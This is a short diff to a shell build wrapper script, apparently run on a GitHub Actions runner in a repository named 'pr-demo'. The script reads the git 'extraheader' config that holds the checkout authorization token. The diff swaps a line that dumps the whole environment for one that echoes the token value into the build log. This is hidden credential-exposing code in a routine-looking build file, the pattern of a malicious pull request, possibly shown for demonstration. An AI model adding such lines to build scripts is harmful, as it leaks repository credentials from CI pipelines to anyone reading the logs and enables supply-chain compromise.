@@ -155,7 +155,7 @@ if $cygwin ; then
 fi
 
 DEBUG_VALUE=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader`
-env
+echo DEBUG_VALUE=$DEBUG_VALUE
 
 
 # Escape application args
